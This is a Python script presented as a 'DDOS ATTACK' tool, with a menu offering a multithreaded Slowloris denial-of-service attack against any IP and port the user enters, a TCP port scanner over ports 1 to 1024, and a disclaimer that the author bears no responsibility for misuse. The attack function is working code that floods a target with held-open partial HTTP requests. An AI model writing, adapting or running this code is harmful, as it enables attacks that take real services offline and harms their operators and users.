import os
import sys
import socket
import threading
import time

# Function to clear the screen
def clear_screen():
    os.system('clear')

# Function to display the DDOS ATTACK header
def show_header():
    clear_screen()
    print("\033[1;31m" + "=" * 50)
    print("DDOS ATTACK".center(50))
    print("=" * 50 + "\033[0m")

# Function to display the main menu
def main_menu():
    show_header()
    print("\n\033[1;32m1. DDOS ATTACK")
    print("2. CHECK PORT")
    print("3. SYSTEM INFO")
    print("4. EXIT\033[0m")
    choice = input("\nChoose an option (1-4): ")
    return choice

# Function to display system information
def system_info():
    clear_screen()
    show_header()
    print("\n\033[1;36mHi, This is DDOS ATTACK Tools")
    print("Created by Azil Himself")
    print("This tool is made as simple as possible because Azil is still learning")
    print("This tool is 100% useful, maybe?")
    print("If you misuse it, I will not be responsible\033[0m")
    input("\nPress Enter to return to the Tools...")
    main()

# Function for DDOS ATTACK
def ddos_attack():
    clear_screen()
    show_header()
    print("\n\033[1;33mDDOS ATTACK TOOLS\033[0m")
    ip = input("\nEnter the IP Address: ")
    port = int(input("Enter the Port: "))
    threads = int(input("Enter the Number of Threads: "))

    # Validate IP Address
    try:
        socket.inet_aton(ip)
    except socket.error:
        print("\033[1;31mInvalid IP Address! Exiting...\033[0m")
        time.sleep(2)
        sys.exit()

    # Function for Slowloris Attack
    def slowloris():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                while True:
                    s.send("X-a: b\r\n".encode())
                    time.sleep(10)
            except:
                time.sleep(1)
            finally:
                try:
                    s.close()
                except:
                    pass

    # Start the attack with multiple threads
    for _ in range(threads):
        threading.Thread(target=slowloris, daemon=True).start()

    print(f"\n\033[1;32mDDOS ATTACK on {ip}:{port} started with {threads} threads...\033[0m")
    input("\nPress Enter to return to the Tools...")
    main()

# Function to check open ports
def check_port():
    clear_screen()
    show_header()
    print("\n\033[1;34mDDOS ATTACK Port Checker\033[0m")
    ip = input("\nEnter the IP Address: ")

    # Validate IP Address
    try:
        socket.inet_aton(ip)
    except socket.error:
        print("\033[1;31mInvalid IP Address! Exiting...\033[0m")
        time.sleep(2)
        sys.exit()

    print(f"\nScanning ports on {ip}...")
    open_ports = []

    # Scan ports from 1 to 1024
    for port in range(1, 1025):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open")
            sock.close()
        except:
            pass

    print("\n\033[1;32mScan completed!\033[0m")
    if open_ports:
        print(f"Open ports: {', '.join(map(str, open_ports))}")
    else:
        print("No open ports found.")
    input("\nPress Enter to return to the Tools...")
    main()

# Main function
def main():
    while True:
        choice = main_menu()
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            check_port()
        elif choice == "3":
            system_info()
        elif choice == "4":
            print("\n\033[1;31mExiting DDOS ATTACK...\033[0m")
            time.sleep(2)
            sys.exit()
        else:
            print("\n\033[1;31mInvalid choice! Try again.\033[0m")
            time.sleep(2)

# Run the program
if __name__ == "__main__":
    main()
